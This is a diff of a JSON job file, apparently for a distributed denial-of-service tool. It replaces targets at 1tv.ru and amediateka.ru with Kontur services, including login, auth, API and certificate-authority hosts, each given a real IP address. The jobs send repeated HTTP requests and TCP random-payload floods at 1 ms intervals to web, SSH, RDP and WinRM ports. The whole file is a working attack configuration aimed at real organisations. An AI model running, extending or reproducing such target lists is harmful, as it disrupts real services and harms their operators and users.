@@ -1,675 +1,597 @@
 {
   "jobs": [{
+      "type": "tcp",
+      "count": 20,
+      "args": {
+        "address": "46.17.203.154:22",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
       "type": "http",
-      "count": 16,
+      "count": 20,
       "args": {
         "request": {
           "method": "GET",
-          "path": "http://www.1tv.ru/live"
+          "path": "http://e-kontur.ru/"
         },
         "client": {
           "static_host": {
-            "addr": "81.177.156.250:80",
+            "addr": "46.17.203.154:80",
             "is_tls": "false"
           }
         }
       }
     }, {
       "type": "http",
-      "count": 16,
+      "count": 20,
       "args": {
         "request": {
           "method": "GET",
-          "path": "https://www.1tv.ru/live"
+          "path": "https://e-kontur.ru/"
         },
         "client": {
           "static_host": {
-            "addr": "81.177.156.250:443",
+            "addr": "46.17.203.154:443",
             "is_tls": "true"
           }
         }
       }
     }, {
       "type": "http",
-      "count": 16,
+      "count": 20,
       "args": {
         "request": {
           "method": "GET",
-          "path": "http://cm.1tv.ru/"
+          "path": "http://elba.kontur.ru/AccessControl/Login"
         },
         "client": {
           "static_host": {
-            "addr": "81.177.156.250:80",
+            "addr": "46.17.203.41:80",
             "is_tls": "false"
           }
         }
       }
     }, {
       "type": "http",
-      "count": 16,
+      "count": 20,
       "args": {
         "request": {
           "method": "GET",
-          "path": "https://cm.1tv.ru/"
+          "path": "https://elba.kontur.ru/AccessControl/Login"
         },
         "client": {
           "static_host": {
-            "addr": "81.177.156.250:443",
+            "addr": "46.17.203.41:443",
             "is_tls": "true"
           }
         }
       }
     }, {
       "type": "http",
-      "count": 16,
+      "count": 20,
       "args": {
         "request": {
           "method": "GET",
-          "path": "http://tlxmob.1tv.ru/"
+          "path": "http://auth.kontur.ru/"
         },
         "client": {
           "static_host": {
-            "addr": "178.248.238.75:80",
+            "addr": "46.17.206.15:80",
             "is_tls": "false"
           }
         }
       }
     }, {
       "type": "http",
-      "count": 16,
+      "count": 40,
       "args": {
         "request": {
           "method": "GET",
-          "path": "https://tlxmob.1tv.ru/"
+          "path": "https://auth.kontur.ru/"
         },
         "client": {
           "static_host": {
-            "addr": "178.248.238.75:443",
+            "addr": "46.17.206.15:443",
             "is_tls": "true"
           }
         }
       }
     }, {
       "type": "http",
-      "count": 16,
+      "count": 20,
       "args": {
         "request": {
           "method": "GET",
-          "path": "http://25.1tv.ru/"
+          "path": "http://install.kontur.ru/"
         },
         "client": {
           "static_host": {
-            "addr": "178.248.238.75:80",
+            "addr": "46.17.203.51:80",
             "is_tls": "false"
           }
         }
       }
     }, {
       "type": "http",
-      "count": 16,
+      "count": 20,
       "args": {
         "request": {
           "method": "GET",
-          "path": "https://25.1tv.ru/"
+          "path": "https://install.kontur.ru/"
         },
         "client": {
           "static_host": {
-            "addr": "178.248.238.75:443",
+            "addr": "46.17.203.51:443",
             "is_tls": "true"
           }
         }
       }
     }, {
       "type": "http",
-      "count": 16,
+      "count": 20,
       "args": {
         "request": {
           "method": "GET",
-          "path": "http://kino.1tv.ru/"
+          "path": "http://kontur.ru/"
         },
         "client": {
           "static_host": {
-            "addr": "178.248.238.75:80",
+            "addr": "46.17.203.102:80",
             "is_tls": "false"
           }
         }
       }
     }, {
       "type": "http",
-      "count": 16,
+      "count": 20,
       "args": {
         "request": {
           "method": "GET",
-          "path": "https://kino.1tv.ru/"
+          "path": "https://kontur.ru/"
         },
         "client": {
           "static_host": {
-            "addr": "178.248.238.75:443",
+            "addr": "46.17.203.102:443",
             "is_tls": "true"
           }
         }
       }
     }, {
       "type": "http",
-      "count": 16,
+      "count": 20,
       "args": {
         "request": {
           "method": "GET",
-          "path": "http://users.1tv.ru/"
+          "path": "http://api.kontur.ru/csi/support/v1/public/integrations/zakupki"
         },
         "client": {
           "static_host": {
-            "addr": "178.248.238.75:80",
+            "addr": "46.17.203.45:80",
             "is_tls": "false"
           }
         }
       }
     }, {
       "type": "http",
-      "count": 16,
+      "count": 20,
       "args": {
         "request": {
           "method": "GET",
-          "path": "https://users.1tv.ru/"
+          "path": "https://api.kontur.ru/csi/support/v1/public/integrations/zakupki"
         },
         "client": {
           "static_host": {
-            "addr": "178.248.238.75:443",
+            "addr": "46.17.203.45:443",
             "is_tls": "true"
           }
         }
       }
     }, {
       "type": "http",
-      "count": 16,
+      "count": 20,
       "args": {
         "request": {
           "method": "GET",
-          "path": "http://edu.1tv.ru/"
+          "path": "http://zakupki.kontur.ru/"
         },
         "client": {
           "static_host": {
-            "addr": "178.248.238.75:80",
+            "addr": "46.17.203.73:80",
             "is_tls": "false"
           }
         }
       }
     }, {
       "type": "http",
-      "count": 16,
+      "count": 20,
       "args": {
         "request": {
           "method": "GET",
-          "path": "https://edu.1tv.ru/"
+          "path": "https://zakupki.kontur.ru/"
         },
         "client": {
           "static_host": {
-            "addr": "178.248.238.75:443",
+            "addr": "46.17.203.73:443",
             "is_tls": "true"
           }
         }
       }
     }, {
       "type": "http",
-      "count": 16,
+      "count": 20,
       "args": {
         "request": {
           "method": "GET",
-          "path": "http://admin.kino.1tv.ru/"
+          "path": "http://pf.kontur.ru/"
         },
         "client": {
           "static_host": {
-            "addr": "178.248.238.75:80",
+            "addr": "46.17.204.249:80",
             "is_tls": "false"
           }
         }
       }
     }, {
       "type": "http",
-      "count": 16,
+      "count": 20,
       "args": {
         "request": {
           "method": "GET",
-          "path": "https://admin.kino.1tv.ru/"
+          "path": "https://pf.kontur.ru/"
         },
         "client": {
           "static_host": {
-            "addr": "178.248.238.75:443",
+            "addr": "46.17.204.249:443",
+            "is_tls": "true"
+          }
+        }
+      }
+    }, {
+      "type": "http",
+      "count": 20,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "http://help.kontur.ru/"
+        },
+        "client": {
+          "static_host": {
+            "addr": "46.17.203.51:80",
+            "is_tls": "false"
+          }
+        }
+      }
+    }, {
+      "type": "http",
+      "count": 20,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "https://help.kontur.ru/"
+        },
+        "client": {
+          "static_host": {
+            "addr": "46.17.203.51:443",
+            "is_tls": "true"
+          }
+        }
+      }
+    }, {
+      "type": "http",
+      "count": 20,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "http://focus.kontur.ru/"
+        },
+        "client": {
+          "static_host": {
+            "addr": "46.17.206.13:80",
+            "is_tls": "false"
+          }
+        }
+      }
+    }, {
+      "type": "http",
+      "count": 20,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "https://focus.kontur.ru/"
+        },
+        "client": {
+          "static_host": {
+            "addr": "46.17.206.13:443",
+            "is_tls": "true"
+          }
+        }
+      }
+    }, {
+      "type": "http",
+      "count": 20,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "http://focus-api.kontur.ru/api3/req/userform"
+        },
+        "client": {
+          "static_host": {
+            "addr": "46.17.206.13:80",
+            "is_tls": "false"
+          }
+        }
+      }
+    }, {
+      "type": "http",
+      "count": 20,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "https://focus-api.kontur.ru/api3/req/userform"
+        },
+        "client": {
+          "static_host": {
+            "addr": "46.17.206.13:443",
+            "is_tls": "true"
+          }
+        }
+      }
+    }, {
+      "type": "http",
+      "count": 20,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "http://ff.kontur.ru/"
+        },
+        "client": {
+          "static_host": {
+            "addr": "46.17.203.72:80",
+            "is_tls": "false"
+          }
+        }
+      }
+    }, {
+      "type": "http",
+      "count": 20,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "https://ff.kontur.ru/"
+        },
+        "client": {
+          "static_host": {
+            "addr": "46.17.203.72:443",
+            "is_tls": "true"
+          }
+        }
+      }
+    }, {
+      "type": "http",
+      "count": 20,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "http://elbank.kontur.ru/AccessControl/Login"
+        },
+        "client": {
+          "static_host": {
+            "addr": "46.17.203.41:80",
+            "is_tls": "false"
+          }
+        }
+      }
+    }, {
+      "type": "http",
+      "count": 20,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "https://elbank.kontur.ru/AccessControl/Login"
+        },
+        "client": {
+          "static_host": {
+            "addr": "46.17.203.41:443",
+            "is_tls": "true"
+          }
+        }
+      }
+    }, {
+      "type": "http",
+      "count": 20,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "http://www.b-kontur.ru/"
+        },
+        "client": {
+          "static_host": {
+            "addr": "46.17.203.154:80",
+            "is_tls": "false"
+          }
+        }
+      }
+    }, {
+      "type": "http",
+      "count": 20,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "https://www.b-kontur.ru/"
+        },
+        "client": {
+          "static_host": {
+            "addr": "46.17.203.154:443",
             "is_tls": "true"
           }
         }
       }
     }, {
       "type": "tcp",
-      "count": 16,
+      "count": 20,
       "args": {
-        "address": "81.177.156.195:25",
+        "address": "46.17.203.229:22",
         "body": "{{ random_payload 10 }}",
         "interval_ms": 1
       }
     }, {
       "type": "http",
-      "count": 16,
+      "count": 20,
       "args": {
         "request": {
           "method": "GET",
-          "path": "https://stage.1tv.ru/"
+          "path": "http://developer.kontur.ru/"
         },
         "client": {
           "static_host": {
-            "addr": "81.177.156.195:443",
+            "addr": "46.17.203.229:80",
+            "is_tls": "false"
+          }
+        }
+      }
+    }, {
+      "type": "http",
+      "count": 20,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "https://developer.kontur.ru/"
+        },
+        "client": {
+          "static_host": {
+            "addr": "46.17.203.229:443",
+            "is_tls": "true"
+          }
+        }
+      }
+    }, {
+      "type": "http",
+      "count": 20,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "https://evrika.kontur.ru/"
+        },
+        "client": {
+          "static_host": {
+            "addr": "46.17.203.229:443",
+            "is_tls": "true"
+          }
+        }
+      }
+    }, {
+      "type": "http",
+      "count": 20,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "http://cabinet.kontur.ru/"
+        },
+        "client": {
+          "static_host": {
+            "addr": "46.17.203.250:80",
+            "is_tls": "false"
+          }
+        }
+      }
+    }, {
+      "type": "http",
+      "count": 20,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "https://cabinet.kontur.ru/"
+        },
+        "client": {
+          "static_host": {
+            "addr": "46.17.203.250:443",
+            "is_tls": "true"
+          }
+        }
+      }
+    }, {
+      "type": "http",
+      "count": 20,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "https://my.kontur.ru/"
+        },
+        "client": {
+          "static_host": {
+            "addr": "46.17.203.250:443",
+            "is_tls": "true"
+          }
+        }
+      }
+    }, {
+      "type": "http",
+      "count": 20,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "http://ca.kontur.ru/"
+        },
+        "client": {
+          "static_host": {
+            "addr": "46.17.203.131:80",
+            "is_tls": "false"
+          }
+        }
+      }
+    }, {
+      "type": "http",
+      "count": 20,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "https://ca.kontur.ru/"
+        },
+        "client": {
+          "static_host": {
+            "addr": "46.17.203.131:443",
             "is_tls": "true"
           }
         }
       }
     }, {
       "type": "tcp",
-      "count": 16,
+      "count": 20,
       "args": {
-        "address": "81.211.33.101:22",
+        "address": "46.17.203.154:22",
         "body": "{{ random_payload 10 }}",
         "interval_ms": 1
       }
     }, {
       "type": "http",
-      "count": 16,
+      "count": 20,
       "args": {
         "request": {
           "method": "GET",
-          "path": "http://subscr.1tv.ru/"
+          "path": "http://www.kontur-extern.ru/"
         },
         "client": {
           "static_host": {
-            "addr": "81.211.33.101:80",
+            "addr": "46.17.203.154:80",
             "is_tls": "false"
           }
         }
       }
     }, {
       "type": "http",
-      "count": 16,
+      "count": 20,
       "args": {
         "request": {
           "method": "GET",
-          "path": "https://subscr.1tv.ru/"
+          "path": "https://www.kontur-extern.ru/"
         },
         "client": {
           "static_host": {
-            "addr": "81.211.33.101:443",
+            "addr": "46.17.203.154:443",
             "is_tls": "true"
           }
         }
-      }
-    }, {
-      "type": "http",
-      "count": 16,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "http://www.amediateka.ru"
-        },
-        "client": {
-          "static_host": {
-            "addr": "212.193.156.175:80",
-            "is_tls": "false"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 16,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://www.amediateka.ru"
-        },
-        "client": {
-          "static_host": {
-            "addr": "212.193.156.175:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 16,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "http://www.amediateka.ru"
-        },
-        "client": {
-          "static_host": {
-            "addr": "212.193.146.216:80",
-            "is_tls": "false"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 16,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://www.amediateka.ru"
-        },
-        "client": {
-          "static_host": {
-            "addr": "212.193.146.216:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 16,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "http://www.amediateka.ru"
-        },
-        "client": {
-          "static_host": {
-            "addr": "46.235.185.186:80",
-            "is_tls": "false"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 16,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://www.amediateka.ru"
-        },
-        "client": {
-          "static_host": {
-            "addr": "46.235.185.186:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 16,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "http://www.amediateka.ru"
-        },
-        "client": {
-          "static_host": {
-            "addr": "46.235.185.75:80",
-            "is_tls": "false"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 16,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://www.amediateka.ru"
-        },
-        "client": {
-          "static_host": {
-            "addr": "46.235.185.75:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 16,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "http://www.amediateka.ru"
-        },
-        "client": {
-          "static_host": {
-            "addr": "46.235.187.127:80",
-            "is_tls": "false"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 16,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://www.amediateka.ru"
-        },
-        "client": {
-          "static_host": {
-            "addr": "46.235.187.127:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 16,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "http://crypt.amediateka.ru"
-        },
-        "client": {
-          "static_host": {
-            "addr": "62.76.27.135:80",
-            "is_tls": "false"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 16,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://crypt.amediateka.ru"
-        },
-        "client": {
-          "static_host": {
-            "addr": "62.76.27.135:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 16,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "http://kodiki.amediateka.ru/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "5.200.52.193:80",
-            "is_tls": "false"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 16,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://kodiki.amediateka.ru/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "5.200.52.193:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "tcp",
-      "count": 16,
-      "args": {
-        "address": "5.200.52.193: 3389",
-        "body": "{{ random_payload 10 }}",
-        "interval_ms": 1
-      }
-    }, {
-      "type": "tcp",
-      "count": 16,
-      "args": {
-        "address": "5.200.52.193:5985",
-        "body": "{{ random_payload 10 }}",
-        "interval_ms": 1
-      }
-    }, {
-      "type": "tcp",
-      "count": 16,
-      "args": {
-        "address": "193.176.79.101:22",
-        "body": "{{ random_payload 10 }}",
-        "interval_ms": 1
-      }
-    }, {
-      "type": "http",
-      "count": 16,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "http://localandroid.amediateka.ru/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "193.176.79.101:80",
-            "is_tls": "false"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 16,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://localandroid.amediateka.ru/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "193.176.79.101:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 16,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "http://localandroid.amediateka.ru/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "193.176.79.101:8080",
-            "is_tls": "false"
-          }
-        }
-      }
-    }, {
-      "type": "tcp",
-      "count": 16,
-      "args": {
-        "address": "5.188.150.190:22",
-        "body": "{{ random_payload 10 }}",
-        "interval_ms": 1
-      }
-    }, {
-      "type": "http",
-      "count": 16,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "http://bbb.amediateka.ru/b"
-        },
-        "client": {
-          "static_host": {
-            "addr": "5.188.150.190:80",
-            "is_tls": "false"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 16,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://bbb.amediateka.ru/b"
-        },
-        "client": {
-          "static_host": {
-            "addr": "5.188.150.190:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "tcp",
-      "count": 16,
-      "args": {
-        "address": "5.188.150.190:8888",
-        "body": "{{ random_payload 10 }}",
-        "interval_ms": 1
-      }
-    }, {
-      "type": "http",
-      "count": 16,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "http://rt.amediateka.ru/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "5.200.52.193:80",
-            "is_tls": "false"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 16,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://rt.amediateka.ru/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "5.200.52.193:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "tcp",
-      "count": 16,
-      "args": {
-        "address": "5.200.52.193:3389",
-        "body": "{{ random_payload 10 }}",
-        "interval_ms": 1
-      }
-    }, {
-      "type": "tcp",
-      "count": 16,
-      "args": {
-        "address": "5.200.52.193:5985",
-        "body": "{{ random_payload 10 }}",
-        "interval_ms": 1
       }
     }
   ]
